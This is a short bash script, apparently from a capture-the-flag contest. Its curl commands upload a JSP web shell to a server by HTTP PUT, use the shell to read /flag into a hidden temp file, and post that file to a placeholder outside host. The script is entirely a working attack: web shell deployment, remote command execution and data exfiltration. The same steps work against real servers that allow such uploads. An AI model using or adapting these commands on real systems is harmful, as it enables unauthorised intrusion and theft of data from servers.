#!/usr/bin/env bash

# Author : Virink <virink@outlook.com>
# Date   : 2020/03/09, 11:41

# CMD Webshell
curl -XPUT 10.10.2.13:8080/lfy.jsp/  -d '@lfy.jsp'

curl 10.10.2.13:8080/lfy.jsp\?lfy=023\&i=cat%20/flag -o /tmp/.lfy

curl xxxxx -F f=@/tmp/.lfy